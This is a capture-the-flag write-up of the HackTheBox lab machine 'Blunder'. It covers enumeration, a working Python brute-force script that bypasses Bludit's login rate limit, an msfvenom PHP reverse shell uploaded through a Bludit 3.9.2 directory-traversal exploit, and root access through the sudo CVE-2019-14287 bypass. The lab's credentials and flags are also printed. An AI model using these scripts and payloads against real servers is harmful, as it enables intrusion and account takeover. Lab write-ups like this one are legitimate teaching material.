**HackTheBox > Machines > Blunder**

key | val
---|---
OS | Linux
Difficulty | Easy
Points | 20
Release | 30 May 2020
IP | 10.10.10.191

# User flag

## Services Enumeration

Let's start by enumerating the services on the machine. Nmap reveals that only 1 port is open, this is the web server, running on its standard port (80).

~~~
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
~~~

## Web Enumeration

### Main page

Accessing the website shows a blog with 3 posts. The source code discloses several paths, 1 of which involving the `/bl-kernel/` directory, where directory listing is enabled. This directory contains several PHP files, and clicking on one of them displays the message `Bludit CMS`.

### Bludit CMS

Bludit CMS (https://www.bludit.com/) latest version, at the time of this writing is `3.13.1`.

The source code reveals that the version installed is `3.9.2`:

~~~
<!-- Include Bootstrap CSS file bootstrap.css -->
<link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-kernel/css/bootstrap.min.css?version=3.9.2">

<!-- Include CSS Styles from this theme -->
<link rel="stylesheet" type="text/css" href="http://10.10.10.191/bl-themes/blogx/css/style.css?version=3.9.2">
~~~

### Hidden directories and files

There is no `robots.txt` file, but enumerating the web server with `gobuster` reveals several hidden locations and hidden files:

~~~
kali@kali:/data/tmp$ gobuster dir -u http://10.10.10.191 -x php,bak,old,zip,txt,tar,gz -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.191
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php,bak,old,zip,txt,tar,gz
[+] Timeout:        10s
===============================================================
2020/09/09 11:07:06 Starting gobuster
===============================================================
[REDACTED]
/about (Status: 200)
/admin (Status: 301)
/cgi-bin/ (Status: 301)
/install.php (Status: 200)
/LICENSE (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/todo.txt (Status: 200)
===============================================================
2020/09/09 11:35:21 Finished
===============================================================
~~~

The `/admin` location shows an authentication form, but trying to enter common credentials (with username `admin`, `root` or `bludit`) only leads to a authentication failures.

The `todo.txt` file is interesting because it discloses a username (`fergus`)

~~~
kali@kali:/data/vpn$ curl -s http://10.10.10.191/todo.txt
-Update the CMS
-Turn off FTP - DONE
-Remove old users - DONE
-Inform fergus that the new blog needs images - PENDING
~~~

## Brute forcing the authentication form

After searching for brute force attack related documents against the Bludit CMS, I found [this post](https://rastating.github.io/bludit-brute-force-mitigation-bypass/) that explains how to bypass the internal anti-brute force mechanism, and even provides a python3 script.

I created a custom wordlist based on the web page, with the default depth settings, as follows:

~~~
kali@kali:/data/tmp$ cewl -w passwords.txt http://10.10.10.191
~~~

I slightly adapted the script to read this wordlist as follows:

```python
#!/usr/bin/env python3
import re
import requests

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = []

with open('passwords.txt') as f:
    content = f.readlines()
    pwd = [x.strip() for x in content]

wordlist = pwd

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```

The script was able to find valid credentials for the `fergus` user:

~~~
kali@kali:/data/tmp$ python3 bf.py 
[*] Trying: the
[*] Trying: Load
[*] Trying: Plugins

[REDACTED]

[*] Trying: best
[*] Trying: fictional
[*] Trying: character
[*] Trying: RolandDeschain

SUCCESS: Password found!
Use fergus:RolandDeschain to login.
~~~

## Directory Traversal exploit

Having valid credentials (`fergus:RolandDeschain`), I was able to login against the `/admin` URL and navigate through the backend. I found a form to post content, and upload an image.

Looking for exploits affecting this release confirmed that there is a possible directory traversal vulnerability:

~~~
kali@kali:/data/tmp$ searchsploit bludit 3.9.2
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Bludit 3.9.2 - Directory Traversal                                                 | multiple/webapps/48701.txt
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
~~~

I downloaded the exploit and started to prepare the necessary files, as explained in the exploit itself. We need to generate 2 files, as follows:

~~~
kali@kali:/data/tmp/files$ msfvenom -p php/reverse_php LHOST=10.10.14.22 LPORT=4444 -f raw -b '"' > evil.png
kali@kali:/data/tmp/files$ echo -e "<?php $(cat evil.png)" > evil.png
kali@kali:/data/tmp/files$ echo "RewriteEngine off" > .htaccess
kali@kali:/data/tmp/files$ echo "AddType application/x-httpd-php .png" >> .htaccess
~~~

Once done, we need to change the IP and port in python file, and we can run the exploit:

~~~
kali@kali:/data/tmp/files$ python3 48701.py 
cookie: apnks075c2p3g17ir7otfnok26
csrf_token: 860c0faaf34d652892fb09e7561b568e7e38dd93
Uploading payload: evil.png
Uploading payload: .htaccess
~~~

At this stage, the malicious content has been uploaded, and we need to start a listener:

~~~
$ rlwrap nc -nlvp 4444
~~~

Now, browsing the following URL will call our reverse shell: http://10.10.10.191/bl-content/tmp/temp/evil.png

## Lateral move

In the reverse shell, I started to browse the file system, and noticed that there are 2 users under the `/home` directory (`hugo` and `shaun`). The `user.txt` flag is in Hugo's home but we can't access it. A lateral move to hugo is obviously required.

~~~
hugo@blunder:~$ ls -la /home/hugo
ls -la /home/hugo
total 80
drwxr-xr-x 16 hugo hugo 4096 Sep  9 12:39 .
drwxr-xr-x  4 root root 4096 Apr 27 14:31 ..
lrwxrwxrwx  1 root root    9 Apr 28 12:13 .bash_history -> /dev/null
-rw-r--r--  1 hugo hugo  220 Nov 28  2019 .bash_logout
-rw-r--r--  1 hugo hugo 3771 Nov 28  2019 .bashrc
drwx------ 13 hugo hugo 4096 Apr 27 14:29 .cache
drwx------ 11 hugo hugo 4096 Nov 28  2019 .config
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Desktop
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Documents
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Downloads
drwx------  3 hugo hugo 4096 Apr 27 14:30 .gnupg
drwxrwxr-x  3 hugo hugo 4096 Nov 28  2019 .local
drwx------  5 hugo hugo 4096 Apr 27 14:29 .mozilla
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Music
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Pictures
-rw-r--r--  1 hugo hugo  807 Nov 28  2019 .profile
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Public
drwx------  2 hugo hugo 4096 Apr 27 14:30 .ssh
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Templates
-r--------  1 hugo hugo   33 Sep  9 09:21 user.txt
drwxr-xr-x  2 hugo hugo 4096 Nov 28  2019 Videos
~~~

Analyzing the `/var/www` directory was interesting because I noticed the presence of 2 instances of the Bludit CMS. Analyzing the configuration files in the most recent version led to disclosing Hugo's password hash:

~~~
$ cat /var/www/bludit-3.10.0a/bl-content/databases/users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
~~~

The hash (`faca404fd5c0a31cf1897b823c695c85cffeb98d`) corresponds to `Password120` (https://sha1.gromweb.com/?hash=faca404fd5c0a31cf1897b823c695c85cffeb98d). Let's switch to `hugo`:

~~~
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ su hugo
su hugo
Password: Password120

hugo@blunder:/var/www/bludit-3.9.2/bl-content/tmp/temp$ id
id
uid=1001(hugo) gid=1001(hugo) groups=1001(hugo)
~~~

## User flag

Now, we can get the user flag:

~~~
hugo@blunder:~$ cat /home/hugo/user.txt
fce4e1ae48b2333b6d46379152876f66
~~~

User flag: `fce4e1ae48b2333b6d46379152876f66`

# Root flag

## Escalation

Checking `hugo`'s privileges with `sudo -l` indicates that we are allowed to execute `/bin/bash` as any user but root:

~~~
hugo@blunder:~$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
~~~

However, we can exploit CVE-2019-14287 (https://www.exploit-db.com/exploits/47502) and elevate to `root`:

~~~
hugo@blunder:~$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
root@blunder:/home/hugo# id
id
uid=0(root) gid=1001(hugo) groups=1001(hugo)
~~~

## Root flag

Let's get the root flag:

~~~
root@blunder:/root# cat /root/root.txt
cat /root/root.txt
4926d71e37b6c245b9c997a55041cff1
~~~

Root flag: `4926d71e37b6c245b9c997a55041cff1`
